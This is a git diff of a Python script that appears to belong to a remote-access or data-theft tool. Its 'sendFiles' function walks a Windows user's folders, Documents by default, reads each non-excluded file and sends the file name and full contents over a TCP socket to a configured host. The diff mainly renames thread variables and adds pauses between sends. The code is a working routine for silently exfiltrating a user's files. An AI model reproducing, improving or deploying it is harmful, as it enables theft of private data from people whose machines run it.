@@ -4,6 +4,7 @@ from glob import glob
 import socket
 from pickle import dumps
 import threading
+import time
 CONN_HOST = "127.0.0.2"
 CONN_PORT = 65433 
 folder = ""
@@ -15,18 +16,18 @@ def getfiles(scan_user: str, dict_files: str):
     return [path.basename(x) for x in glob('C:\\Users\\'+scan_user+'\\'+dict_files+'\\*') if '.lnk' not in x]
 
 
-""" # Created threads for each function cuz CLI wouldnt work without it
+# Created threads for each function cuz CLI wouldnt work without it
 def start_FolderData(fol: str):
-        keyThread = threading.Thread(target=lambda: sendFolderData(fol))
-        keyThread.daemon = True
-        keyThread.start()
-        keyThread.join()
+        FolderThread = threading.Thread(target=lambda: sendFolderData(fol))
+        FolderThread.daemon = True
+        FolderThread.start()
+        FolderThread.join()
 
-def start_sendFiles(filedir: str, filename: str):
-        keyThread = threading.Thread(target=lambda: sendFiles(filedir, filename))
-        keyThread.daemon = True
-        keyThread.start()
-        keyThread.join() """
+def start_sendFiles(filedir: str):
+        FileThread = threading.Thread(target=lambda: sendFiles(filedir))
+        FileThread.daemon = True
+        FileThread.start()
+        FileThread.join()
 
 
 def sendFolderData(fol: str):
@@ -58,8 +59,10 @@ def sendFiles(filedir: str):
         print(f"Got {filedir}")
     except:
         filedir = "Documents"
+
     full_path =  "C:\\Users\\" + getuser()[0] + "\\" + filedir
     print(full_path)
+    
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as suck:
         suck.connect((CONNF_HOST, CONNF_PORT))
         print("Connected socket")
@@ -67,22 +70,30 @@ def sendFiles(filedir: str):
         for filename in listdir(full_path): # Get each file in folder
             if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
                 print("Got filename: ", filename)
+                
+                # encode() a bytes() robia skoro to iste
                 msg = f"FILENAME:{filename}"
-                suck.send(msg.encode("utf-8")) # Send file name and type
+                suck.send(msg.encode("utf-8")) # FILENAME:{filename}
 
                 dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "r")
                 print("Got file dir: ", dict_files.name)
-
+                time.sleep(0.2)
+                
                 file_data = dict_files.read()
-
                 msg = f"DATA:{file_data}"
                 suck.send(msg.encode("utf-8"))
-
+                msg = ""
+                
+                time.sleep(0.2)
                 msg = f"FINISH:Completed"
                 suck.send(msg.encode("utf-8"))
                 print("Transfer completed")
+                msg = ""
+
+        time.sleep(0.2)         
         suck.send("CLOSE:Closing down".encode("utf-8"))
+        msg = ""
         suck.close()
 
-    print("Transfer Finished")
+    print("File socket closed.")
     suck.close()
